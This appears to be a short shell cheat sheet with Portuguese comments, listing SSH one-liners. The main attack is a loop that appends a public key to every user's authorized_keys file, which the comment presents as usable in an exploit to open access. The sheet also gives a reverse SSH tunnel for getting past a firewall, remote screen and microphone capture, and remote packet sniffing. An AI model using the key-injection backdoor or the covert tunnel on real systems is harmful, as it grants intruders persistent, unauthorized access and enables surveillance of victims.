# Exportar saída do microfone via ssh:
dd if=/dev/dsp | ssh -c arcfour -C user@host dd of=/dev/dsp

# Injetar chave publica nos hosts autorizados (localmente).
# Pode ser usado em um exploit # para abrir a conexão.
key="PUBLIC_KEY" # Chave pública.

for user in $(ls /home/)
do
  if test -f "/home/$user/.ssh/authorized_keys";
  then
    echo "[+] File found on user $user/.ssh/";
  else
    echo "[*] Creating file on user $user/.ssh/";
    touch /home/$user/.ssh/authorized_keys;
  fi
  echo -n $key >> /home/$user/.ssh/authorized_keys;
done;

# Conexão reversa burlando firewall com port fowarding:
ssh -R 5397:127.0.0.1:22 -p 55555 user@public.ip

# Abrir screenshot de host remoto:
xloadimage <(ssh user@host DISPLAY=:0.0 import -window root png:-)

# Monitorar tráfego em rede externa:
ssh user@host tcpdump -U -s -w -'not port 22' | wireshark -k -i - # Primeira forma.
ssh user@host 'tshark -f "port !22" -w -' | wireshark -k -i - # Alternativa.

# Proxy Bridge:
ssh -t host1 ssh host2
